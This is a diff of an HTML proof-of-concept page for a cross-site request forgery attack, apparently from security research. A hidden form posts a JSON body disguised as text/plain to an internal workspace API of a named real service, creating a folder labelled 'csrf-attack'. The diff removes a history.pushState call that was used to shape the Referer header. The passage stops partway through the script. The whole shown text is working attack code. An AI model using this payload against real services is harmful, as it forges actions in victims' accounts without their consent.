@@ -11,13 +11,7 @@
   <form id="f" ENCTYPE="text/plain" action="https://docs.superhuman.com/internalAppApi/workspaces/ws-96RE0OTDqM/folders" method="post">
     <input id="z" type="hidden" name='test' value='test"}'>
   </form>
-    <script>      
-      // You need to set this or the domain won't appear in the query of the referer header
-      history.pushState(
-        "",
-        "",
-        "https://docs.superhuman.com/workspaces/ws-96RE0OTDqM/folders"
-      )
+    <script>   
       $(document).ready(
         function() {
           $("#z").attr("name",'{"name":"test-csrf","icon":null,"iconColor":null,"description":"csrf-attack","fakeparam":"');
